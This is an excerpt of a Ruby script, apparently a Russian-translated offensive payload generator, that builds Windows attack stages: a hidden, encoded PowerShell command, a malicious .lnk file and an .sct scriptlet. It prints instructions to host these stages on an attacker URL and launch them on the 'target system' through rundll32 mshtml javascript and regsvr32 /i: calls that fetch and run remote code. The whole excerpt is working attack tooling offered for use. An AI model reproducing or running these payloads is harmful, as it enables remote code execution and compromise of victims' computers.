...
puts "------------скопируй index.html и вставь его в #{stageURL}--------------"
puts "Для запуска выполните следующие действия в целевой системе:\nrundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:#{stageURL}/index.html\")"
...
puts "Этот формат кодирования требует промежуточной обработки!"
puts "Введите полный URL-адрес, на котором будет размещаться полезная нагрузка:"
stageURL = gets.chomp!
...
puts "Cозданная полезная нагрузка! - file.lnk\n\n"

powershell_encoded = gen_PS_shellcode()
outSTAGE = "powershell -nop -win Hidden -noni -enc #{powershell_encoded}"
File.write( 'file.html', outSTAGE) 
puts "Стэйдж файл создан! - file.html\n\n"

puts "-------------копируй file.html и вставь в #{stageURL}--------------"
puts "Чтобы запустить, выполните:\"file.lnk\" на системе цели"
...
puts "Создано! - index.sct\n\n\n"


puts "-------------copy the index.sct and host it on #{stageURL}--------------"
puts "Для запуска выполните следующие действия в целевой системе:\nregsvr32 /s /n /u /i:#{stageURL}/index.sct scrobj.dll"
puts"Спасибо, за использование моего репозитория! Translate and By: UnderRussia"
end
